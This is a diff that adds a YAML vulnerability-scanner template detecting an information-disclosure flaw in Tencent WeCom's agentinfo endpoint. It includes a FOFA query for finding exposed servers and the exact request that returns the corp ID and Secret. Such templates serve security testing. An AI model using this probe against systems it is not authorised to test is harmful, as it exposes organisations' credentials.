@@ -1,0 +1,24 @@
+id: tencent-wechat-agentinfo-disclosure
+
+info:
+  name: 腾讯 企业微信 agentinfo 信息泄漏漏洞
+  author: peiqi
+  severity: high
+  verified: true
+  description: |
+    腾讯 企业微信 agentinfo 接口存在信息泄漏漏洞，攻击者通过漏洞可以获取企业微信 Secret
+    FOFA: body="wework_admin.normal_layout"
+  reference:
+    - https://peiqi.wgpsec.org/wiki/webapp/腾讯/腾讯%20企业微信%20agentinfo%20信息泄漏漏洞.html
+  tags: tencent,wechat,disclosure
+  created: 2023/08/13
+
+set:
+  randstr: randomLowercase(12)
+rules:
+  r0:
+    request:
+      method: GET
+      path: /cgi-bin/gateway/agentinfo
+    expression: response.status == 200 && response.body.bcontains(b'"strcorpid":') && response.body.bcontains(b'"Secret":')
+expression: r0()
